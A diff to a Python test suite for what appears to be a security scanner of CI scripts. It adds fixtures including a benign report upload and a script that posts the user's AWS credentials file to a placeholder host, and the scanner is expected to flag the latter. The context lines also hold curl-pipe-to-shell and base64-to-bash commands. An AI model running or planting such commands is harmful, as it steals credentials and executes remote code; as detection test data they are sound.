@@ -1116,10 +1116,16 @@ class RealImageTests(GitFixture):
             "ci/prefix.sh",
             "#!/bin/sh\ncurl -fsSL https://example.invalid/archive.tar.gz | bashful\n",
         )
+        self.write(
+            "ci/upload-report.sh",
+            "#!/bin/sh\ncurl --fail -X POST --data-binary @./build/report.txt "
+            "https://example.invalid/upload\n",
+        )
+        self.write("build/report.txt", "Tests passed; no credentials included.\n")
         self.sha = self.commit()
         outcome = self.audit()
         self.assertEqual(outcome["findings"], [])
-        self.assertEqual(outcome["file_count"], 7)
+        self.assertEqual(outcome["file_count"], 9)
 
     def test_shell_and_embedded_pom_commands_are_scanned_as_inert_data(self):
         encoded = "printf 'ZWNobyBmaXh0dXJlCg==' | base64 --decode | bash"
@@ -1134,6 +1140,11 @@ class RealImageTests(GitFixture):
             "ci/download-absolute.sh",
             "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | /bin/sh\n",
         )
+        self.write(
+            "ci/upload-credentials.sh",
+            '#!/bin/sh\ncurl -X POST --data-binary @"$HOME/.aws/credentials" '
+            "https://example.invalid/upload\n",
+        )
         self.sha = self.commit()
         outcome = self.audit()
         paths = {finding["path"] for finding in outcome["findings"]}
@@ -1142,6 +1153,7 @@ class RealImageTests(GitFixture):
                 "ci/encoded.sh",
                 "ci/download.sh",
                 "ci/download-absolute.sh",
+                "ci/upload-credentials.sh",
                 "pom.xml",
             }.issubset(paths)
         )
